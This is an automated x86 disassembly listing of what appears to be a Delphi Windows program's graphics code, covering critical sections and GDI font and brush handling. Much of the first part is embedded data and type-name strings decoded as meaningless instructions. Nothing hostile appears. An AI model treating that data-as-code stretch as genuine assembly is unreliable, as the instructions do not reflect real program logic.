jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0xb488c08b
inc ecx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ esp + esi * 4 + 0x70070041 ] bl
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
dec esi
outsd
je r-xdata
dec esi
outsd
pop es
jo r-xdata
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
mov al 0xb6
inc ecx
add [ eax ] al
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x41b50890
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 4 - 0x4963ffbf ] dl
inc ecx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
rol ah 0xb5
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
inc ecx
add [ esi ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xor al 0xb4
popad
jb r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
jae r-xdata
popad
jae r-xdata
push es
je r-xdata
pop eax
dec esi
jo r-xdata
inc esp
outsd
or [ edi + 0x72 ] al
popad
jo r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add al al
mov ch 0x41
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
pop es
jb r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
dec ebp
push eax
outsb
insb
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x41b40c90
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
push esp
inc edi
jb r-xdata
enter 0x41 0xf
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
jb r-xdata
inc ebx
outsd
jo r-xdata
mov eax eax
les esi [ ebp + 0xb030041 ]
push esp
inc edx
jb r-xdata
inc edi
jb r-xdata
add [ eax ] al
fdiv [ esi + 0x200041 ]
add [ eax ] al
add [ eax ] eax
std
imul esp [ ebx + 0x73 ] 0xffff0001
nop
pop esp
mov bh 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x49 ] ch
inc ecx
add [ edi + esi * 4 + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
jpe r-xdata
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + esi * 4 - 0x4a ] si
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
add [ eax + 0x41 ] al
add [ eax ] dl
inc ecx
inc ecx
add [ eax ] bl
inc ecx
inc ecx
add [ eax + eax * 2 ] ch
inc ecx
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x28004116 ] cl
jpe r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
jae r-xdata
dec ebp
popad
jae r-xdata
push es
jo r-xdata
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
nop
inc edi
mov [ esi + 0x41 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
inc ecx
imul esp [ ebx + 0x73 ] 0xb5c4c08b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41b6 ] dh
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
dec esi
outsd
je r-xdata
inc ecx
add [ edx + 0x240041b7 ] al
add [ eax ] al
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + ecx * 4 - 0x4a ] si
inc ecx
add ah bh
push ss
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc ecx
add [ eax ] ch
outsb
je r-xdata
dec ebp
jb r-xdata
add [ ebx ] al
outsb
jb r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
[ eax + 0xf0041c8 ]
jo r-xdata
outsd
popad
insb
dec esi
outsd
je r-xdata
inc ecx
add [ eax ] dl
inc ecx
inc ecx
add [ eax ] bl
inc ecx
inc ecx
add ah ch

inc eax
add [ eax + esi - 0x3457ffc0 ] ch
imul sp [ ebp + 0x72 ] 0x1114
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
add [ esi + esi * 4 ] bh
inc ecx
xor [ edi + 0x240041 ] 0x0
jo r-xdata
add [ esi + esi * 4 + 0x180041 ] bl
add [ eax ] al
mov [ esi ] dl
insb
dec esi
outsd
or dh [ gs : eax + 0x6d ]
popad
imul esp [ ebx + 0x73 ] 0x41b68890
call eax

add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bl
mov dh 0x41
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
jo r-xdata
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
test al 0xcb
mov dh 0x41
imul esp [ ebx + 0x73 ] 0xc08b0000
fdiv [ esi + 0xf0f0041 ]
dec ecx
inc ebx
push 0x65676e61
sub_41b766
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bl
mov dh 0x41
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
call eax

sub_41b7d3
int 0x41
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050001 ] al
outsd
insb
outsd
jb r-xdata
popad
insd
les esi [ gs : ebx - 0x2fdfffbf ]
inc ecx
add [ eax ] ch
rol [ ecx ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
lodsb [ esi ]
iretd
adc [ eax ] al
or bh cl
inc ecx
add [ eax ] dl
iretd
sub_41b811
inc ecx
add [ eax - 0x31 ] dl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
popad
insd
les esi [ gs : ebx - 0x2fdfffbf ]
inc ecx
add [ eax ] ch
rol [ ecx ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
lodsb [ esi ]
iretd
sub_41b873
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
insb
lea eax [ eax ]
fdivr [ eax + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb bl dl
inc ecx
add [ eax ] ah
rol [ ecx ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax [ eax ]
add eax 0x74646957
push 0xb9d8c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
mov ecx 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xb9
inc ecx
add [ eax ] bl
add [ eax ] al
add [ esi + esi * 4 ] bh
inc ecx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
mov ebx ss
inc ecx
add [ eax ] dl
inc ecx
inc ecx
add [ eax ] bl
inc ecx
inc ecx
add [ ebx + edx * 8 + 0x54060041 ] dh
inc edx
jb r-xdata
imul esp [ ebx + 0x73 ] 0xb2e80004
inc ecx
add [ edx + edx * 8 ] cl
inc ecx
add [ edx + edx * 8 ] dl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
sar [ edx + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 4 + 0x580041 ] dh
jae r-xdata
add [ eax ] al
call esp
rol [ ecx ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
add [ eax ] eax
add al 0x4d
outsd
pushfd
mov ah 0x41
add al ch
rol [ ecx ] cl
mov ch 0x41
add [ eax ] bl
jns r-xdata
jae r-xdata
add [ eax ] al
mov [ esi ] dl
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
mov edx 0x41
nop
add al 0x24
retn
outsd
mov [ gs : edi + 0xc0041 ] dh
add bh bh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
or bh dl
inc ecx
add [ eax ] dl
inc ecx
inc ecx
add [ eax ] bl
inc ecx
inc ecx
add [ eax + eax * 2 ] ch
inc ecx
add [ eax ] bl
fld [ ecx ]
add al 0xdd
inc ecx
add [ eax ] bh
fadd [ ecx ]
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
mov edx 0x7070041
push esp
inc ebx
popad
outsb
jbe r-xdata
outsd
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add al 0x46
mov eax 0x100041
add bh bh
in al dx
fiadd [ ecx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add edx [ eax + 0x65 ]
outsb
mov eax eax
int3
fcomp st2
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xba
inc ecx
add [ eax ] bl
mov edx 0x16fc0041
inc ecx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xb9ec0004
inc ecx
add [ eax + eax ] dl
add bh bh
clc
fiadd [ ecx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add eax 0x73757242
push r-xdata
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
add al 0xdc
jmp sub_414240
dec ebp
sub_41b9ed
mov ecx 0x6070041
add [ eax ] al
add [ eax ] al
add [ edx + edi * 4 + 0x580041 ] dh
jae r-xdata
jns r-xdata
jae r-xdata
sar [ edx + 0x41 ] 0x0
fdivr [ ecx - 0x4953ffbf ]
inc ecx
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
add al 0x24
retn
outsd
mov [ gs : edi + 0xc0041 ] dh
add bh bh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
or bh dl
inc ecx
add [ eax ] dl
inc ecx
inc ecx
add [ eax ] bl
inc ecx
inc ecx
add [ eax + eax * 2 ] ch
inc ecx
add [ eax ] bl
fld [ ecx ]
add al 0xdd
inc ecx
add [ eax ] bh
fadd [ ecx ]
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
mov edx 0x7070041
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add al 0x46
mov eax 0x100041
add bh bh
in al dx
fiadd [ ecx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add edx [ eax + 0x65 ]
outsb
mov eax eax
int3
fcomp st2
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
jae r-xdata
add [ eax ] al
mov [ esi ] dl
inc ecx
add [ eax ] ch
mov ah 0xba
inc ecx
add [ eax ] bl
imul esp [ ebx + 0x73 ] 0xb2e80002
inc ecx
add ah ch
aam 0x41
add ah dh
aam 0x41
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov edx 0x16fc0041
inc ecx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
push esp
inc edx
jb r-xdata
inc ecx
add [ edi ] al
push es
mov ch 0x41
add [ eax ] cl
salc
inc ecx
add [ eax ] dl
salc
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
pushfd
mov edx 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esp [ ebx + 0x73 ] 0xb9ec0004
inc ecx
add [ eax + eax ] dl
add bh bh
clc
fiadd [ ecx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add eax 0x73757242
push r-xdata
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
add al 0xdc
jmp sub_414240
dec ebp
sub_41bbd8
mov dl 0xbb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 4 + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ecx + eax * 2 + 0x41bc8c00 ] bh
add [ eax ] ch
add [ eax ] al
add [ eax + 0x17 ] bh
inc ecx
add [ eax ] ch
xor eax [ eax ]
rol [ ecx + 0x41 ] 0x1
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
add [ eax + 0x41 ] al
add [ eax ] dl
inc ecx
inc ecx
add [ eax + 0x2c0041f1 ] bh
inc eax
inc ecx
add [ eax + 0x42 ] ah
inc ecx
add [ eax - 0xf ] cl
inc ecx
add [ ecx + ebp ] ch
inc eax
add [ edx + esi * 8 ] al
inc ecx
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ebx + esi * 8 + 0x41 ] cl
add [ eax - 0xd ] dl
inc ecx
add [ ecx + ebp ] ch
inc eax
add al dl
inc ecx
add [ ecx + ebp ] ch
inc eax
add [ esp + esi * 8 ] dh
inc ecx
add [ eax ] bh
hlt
sub_41bc5e
inc ecx
add [ ecx + ebp ] ch
inc eax
add [ eax - 0xc ] cl
inc ecx
add [ eax ] dl
int1
inc ecx
add [ ebx + esi * 8 + 0x41 ] dl
add ah bl
inc ecx
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx ] al
add ch bh
[ eax + 0x80041f3 ]
sub_41bc8d
push esp
inc edi
jb r-xdata
inc eax
add [ ebx + esi ] bh
jo r-xdata
xor [ eax ] al
call 0x2c41fd39
sub [ eax ] eax
add [ eax - 0x53ffbfd0 ] dl
imul esp [ ebx - 0x73 ] 0xbc9c0040
inc ecx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
or al 0x54
push ebx
push 0x64657261
dec ecx
imul esp [ ebx + 0x20 ] 0xfc0041bc
pop ss
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
insd
popad
lea eax [ bx + si ]
push 0x41bd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi * 4 + 0x41 ] ch
add [ eax + eax ] dh
add [ esp + edi * 4 + 0x33280041 ] bh
inc eax
add [ ebx + esi ] dh
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
xor al bh
inc ecx
add [ eax + edi * 8 + 0x540c0041 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
enter 0x41bd 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
mov esi 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ esi + 0x3c0041 ] bh
add [ eax ] al
aam 0xbb
inc ecx
add [ eax ] ch
xor eax [ eax ]
rol [ ecx + 0x41 ] 0x1
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
sbb al 0x3
inc edx
add [ eax ] dl
inc ecx
inc ecx
add [ eax + 0x580041f1 ] bh
add eax [ edx ]
pushad
inc edx
inc ecx
add [ eax + 0x5ac0042 ] ch
inc edx
add [ edx + esi * 8 ] al
inc ecx
add [ eax + 0x8 ] ah
inc edx
add [ ecx + ecx ] dl
inc edx
add [ ecx + ecx + 0x42 ] dl
add [ eax - 0xd ] dl
inc ecx
add [ eax - 0x63ffbdf7 ] dh
or eax 0x15980042
inc edx
add [ esi + edx + 0x42 ] ch
add [ eax ] bh
hlt
inc ecx
add [ eax ] al
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
imul esp [ ebx + 0x73 ] 0x8900000
mov ebp 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xbd
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x28004010 ] ah
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
sub_41c020
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_41c05c
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_41c098
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_41c00c
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_41c080
xor edx edx
push ebp
push sub_41c16c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c173
mov eax [ ebp - 0x4 ]
call sub_41c08c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026cc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028c8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407a40
test al al
je r-xdata
sub_41c17c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c080
xor ecx ecx
push ebp
push sub_41c203
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c08c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_41c22c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c080
xor eax eax
push ebp
push sub_41c295
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41c098
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41c17c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c29c
mov eax [ ebp - 0x4 ]
call sub_41c08c
retn
mov eax ebx
mov si 0xfffd
call sub_4032f4
sub_41c2a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c080
xor eax eax
push ebp
push sub_41c300
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c307
mov eax [ ebp - 0x4 ]
call sub_41c08c
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_4032f4
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c17c
sub_41c310
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c080
xor edx edx
push ebp
push sub_41c36f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c376
mov eax [ ebp - 0x4 ]
call sub_41c08c
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_41c37c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_413df4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c419
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4139f4
mov ebx eax
mov eax ebx
call sub_41d948
inc [ ebp - 0x4 ]
mov eax ebx
call sub_41dbdc
mov eax [ rw-data ]
call sub_41c310
mov eax [ rw-data ]
call sub_41c310
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c420
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_413e58
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4139f4
call sub_41dab4
inc esi
dec ebx
jne r-xdata
sub_41ca6f
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_4134a4
retn
sub_41caa0
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
